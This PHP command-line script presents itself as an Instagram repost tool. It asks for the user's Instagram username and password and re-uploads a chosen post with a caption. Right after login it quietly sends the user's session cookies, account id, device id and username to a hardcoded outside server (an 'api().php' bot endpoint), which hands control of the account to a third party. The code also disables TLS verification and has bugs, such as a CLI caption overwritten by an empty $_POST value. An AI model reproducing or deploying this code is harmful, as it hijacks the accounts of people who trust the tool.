<?php
require('../func.php');
require('../ass.php');
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('Asia/Jakarta');
echo $cyan;
echo banner();
sleep(1);
echo banner1();
echo banner2();
sleep(1);
echo $normal;
echo "" . $yellow . "[?]" . $normal . " Input your instagram username : ";
$userig = trim(fgets(STDIN, 1024));
echo "" . $yellow . "[?]" . $normal . " Input your instagram password : ";
$passig    = trim(fgets(STDIN, 1024));
// kyaa
$useragent = generate_useragent();
$device_id = generate_device_id();
$user      = $userig;
$pass      = $passig;
$login     = proccess(1, $useragent, 'accounts/login/', 0, hook('{"device_id":"' . $device_id . '","guid":"' . generate_guid() . '","username":"' . $userig . '","password":"' . $passig . '","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}'), array(
    'Accept-Language: id-ID, en-US',
    'X-IG-Connection-Type: WIFI'
));
$ext       = json_decode($login[1]);
if ($ext->status <> 'ok') {
    echo $ext->message . "\n";
} else {
    preg_match_all('%Set-Cookie: (.*?);%', $login[0], $d);
    $cookie = '';
    for ($o = 0; $o < count($d[0]); $o++)
        $cookie .= $d[1][$o] . ";";
    $uname       = $ext->logged_in_user->username;
    $req         = proccess(1, $useragent, 'feed/timeline/', $cookie);
    $is_verified = (json_decode($req[1])->status <> ok) ? 0 : 1;
    $uid         = $ext->logged_in_user->pk;
    echo "" . $green . "[+] Login Success...." . $normal . "\n";
    echo "" . $green . "[+] Please Wait" . $normal . "\n";
    sleep(1);
    $data  = array(
        'aksi' => 'addig',
        'id' => $uid,
        'cookies' => $cookie,
        'useragent' => $useragent,
        'device_id' => $device_id,
        'verifikasi' => $is_verified,
        'username' => $uname,
        'uplink' => 'admin'
    );
    $addig  = json_decode(req('http://198.204.232.138/~nthanfpm/other/bot/action/api().php', $data));
    //start
    echo "" . $yellow . "[?]" . $normal . " Input Post URL : ";
    $target = trim(fgets(STDIN, 1024));
    echo "" . $yellow . "[?]" . $normal . " Input Caption : ";
    $capt   = trim(fgets(STDIN, 1024));
    $iyh    = true;
    echo "\n";
    $info   = proccess(1, $useragent, 'media/'.getmediaid($target).'/info/', $cookie);
    $info   = json_decode($info[1], true);
    if($info['status'] == 'ok'){
        if($info['items'][0]['media_type'] == 1){
            $url          = $info['items'][0]['image_versions2']['candidates'][0]['url'];
            $contents     = file_get_contents($url);
            $imagename    = basename($url);
            $save_path    = "./tmp/".time().".jpg";
            file_put_contents($save_path, $contents);
            // uploading
            $file      = './tmp/'.$imagename.'';
            $photo     = curl_file_create(realpath($save_path));
            $upid      = number_format(round(microtime(true) * 1000), 0, '', '');
            $posts     = proccess(1, $useragent, 'upload/photo/', $cookie, array('upload_id' => $upid, 'image_compression' => '{"lib_name":"jt","lib_version":"1.3.0","quality":"100"}', 'photo' => $photo), array('Accept-Language: id-ID, en-US', 'X-IG-Connection-Type: WIFI'));
            $post      = json_decode($posts[1]);
            $capt      = $_POST['caption'];
            if($post->status==ok){
                $x       = proccess(1, $useragent, 'media/configure/', $cookie, hook('{"device_id":"'.$f['device_id'].'","guid":"'.generate_guid().'","upload_id":"'.$post->upload_id.'","caption":"'.trim(urldecode(str_replace('%0D%0A', '\n', urlencode($capt)))).'","device_timestamp":"'.time().'","source_type":"4","filter_type":"0","extra":"{}","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}'), array('Accept-Language: id-ID, en-US', 'X-IG-Connection-Type: WIFI'));
                $xs     = json_decode($x[1]);
                if($xs->status == 'ok'){
                    echo "".$green."[+] Upload success....".$normal."\n";
                } else  {
                    echo "".$yellow."[!] Failed ".$normal."\n";
                }
            } else {
                echo "".$yellow."[!] Failed to Upload ".$normal."\n";
            }
        } else if($info['items'][0]['media_type'] == 2){
            $url          = $info['items'][0]['video_versions'][0]['url'];
            $contents     = file_get_contents($url);
            $imagename    = basename($url);
            $save_path    = "./tmp/".time().".mp4";
            file_put_contents($save_path,$contents);
            $urlthumb     = $info['items'][0]['image_versions2']['candidates'][0]['url'];
            $contentsjpg  = file_get_contents($urlthumb);
            $thumb_path   = "./tmp/".time().".jpg";
            file_put_contents($thumb_path,$contentsjpg);
            $thumbnail    = curl_file_create(realpath($thumb_path));
            $upid         = number_format(round(microtime(true) * 1000), 0, '', '');
            $posts        = proccess(1, $useragent, 'upload/video/', $cookie, array('upload_id' => $upid, 'media_type' => 2), array('Accept-Language: id-ID, en-US', 'X-IG-Connection-Type: WIFI'));
            $post         = json_decode($posts[1], true);
            $poststhumb   = proccess(1, $useragent, 'upload/photo/', $cookie, array('upload_id' => $upid, 'image_compression' => '{"lib_name":"jt","lib_version":"1.3.0","quality":"100"}', 'photo' => $thumbnail), array('Accept-Language: id-ID, en-US', 'X-IG-Connection-Type: WIFI'));
            $postthumb    = json_decode($poststhumb[1]);
            if($post['status'] == ok){
                $uploadUrl = $post['video_upload_urls'][3]['url'];
                $job       = $post['video_upload_urls'][3]['job'];
                $headers   = array();
                $headers[] = "Session-ID: ".$upid;
                $headers[] = "job: ".$job;
                $headers[] = "Content-Disposition: attachment; filename=\"".str_replace('./tmp/', '', $save_path)."\"";
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL,$uploadUrl);
                curl_setopt($ch, CURLOPT_HEADER, false);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
                curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                curl_setopt($ch, CURLOPT_POSTFIELDS, file_get_contents(realpath($save_path)));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
                curl_setopt($ch, CURLOPT_COOKIE, $cookie);
                $result = curl_exec($ch);
                $arrResult = json_decode($result, true);
                curl_close ($ch);
                if($arrResult['status'] == "ok"){
                    sleep(20);
                    $x       = proccess(1, $useragent, 'media/configure/?video=1', $cookie, hook('{"device_id":"'.$f['device_id'].'","guid":"'.generate_guid().'","upload_id":"'.$upid.'","caption":"'.trim(urldecode(str_replace('%0D%0A', '\n', urlencode($capt)))).'","device_timestamp":"'.time().'","source_type":"4","filter_type":"0","extra":"{}","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}'), array('Accept-Language: id-ID, en-US', 'X-IG-Connection-Type: WIFI'));
                    $xs      = json_decode($x[1]);
                    if($xs->status == 'ok'){
                        echo "".$green."[+] Upload success....".$normal."\n";
                    } else  {
                        echo "".$yellow."[!] Failed ".$normal."\n";
                    }
                } else {
                  echo "".$yellow."[!] Failed ".$normal."\n";
                }
            } else {
                echo "".$yellow."[!] Failed to Upload ".$normal."\n";
            }
        } else if($info['items'][0]['media_type'] == 8){
            echo "".$yellow."[!] Can't Repost Album Media ".$normal."\n";
        }
    } else {
        echo "".$yellow."[!] Error to Get Media".$normal."";
    }
}
?>